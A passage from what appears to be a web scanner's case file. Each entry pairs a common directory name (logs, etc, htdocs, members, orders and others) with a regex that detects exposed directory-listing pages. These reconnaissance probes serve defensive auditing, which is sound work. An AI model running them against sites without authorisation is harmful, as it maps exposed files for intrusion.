        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "down",
        "encode":  "NO",
    },

    {
        "case_id": 1060010038,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "download",
        "encode":  "NO",
    },

    {
        "case_id": 1060010039,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "downloads",
        "encode":  "NO",
    },

    {
        "case_id": 1060010040,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "error-log",
        "encode":  "NO",
    },

    {
        "case_id": 1060010041,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "error_log",
        "encode":  "NO",
    },

    {
        "case_id": 1060010042,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "errorlog",
        "encode":  "NO",
    },

    {
        "case_id": 1060010043,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "etc",
        "encode":  "NO",
    },

    {
        "case_id": 1060010044,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "example",
        "encode":  "NO",
    },

    {
        "case_id": 1060010045,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "examples",
        "encode":  "NO",
    },

    {
        "case_id": 1060010046,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "global",
        "encode":  "NO",
    },

    {
        "case_id": 1060010047,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "globals",
        "encode":  "NO",
    },

    {
        "case_id": 1060010048,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "htdocs",
        "encode":  "NO",
    },

    {
        "case_id": 1060010049,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "icons",
        "encode":  "NO",
    },

    {
        "case_id": 1060010050,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "image",
        "encode":  "NO",
    },

    {
        "case_id": 1060010051,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "images",
        "encode":  "NO",
    },

    {
        "case_id": 1060010052,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "inc",
        "encode":  "NO",
    },

    {
        "case_id": 1060010053,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "include",
        "encode":  "NO",
    },

    {
        "case_id": 1060010054,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "install",
        "encode":  "NO",
    },

    {
        "case_id": 1060010055,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "log",
        "encode":  "NO",
    },

    {
        "case_id": 1060010056,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "logfile",
        "encode":  "NO",
    },

    {
        "case_id": 1060010057,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "logfiles",
        "encode":  "NO",
    },

    {
        "case_id": 1060010058,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "logs",
        "encode":  "NO",
    },

    {
        "case_id": 1060010059,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "manual",
        "encode":  "NO",
    },

    {
        "case_id": 1060010060,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "member",
        "encode":  "NO",
    },

    {
        "case_id": 1060010061,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "members",
        "encode":  "NO",
    },

    {
        "case_id": 1060010062,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "old",
        "encode":  "NO",
    },

    {
        "case_id": 1060010063,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "orders",
        "encode":  "NO",
    },

    {
        "case_id": 1060010064,
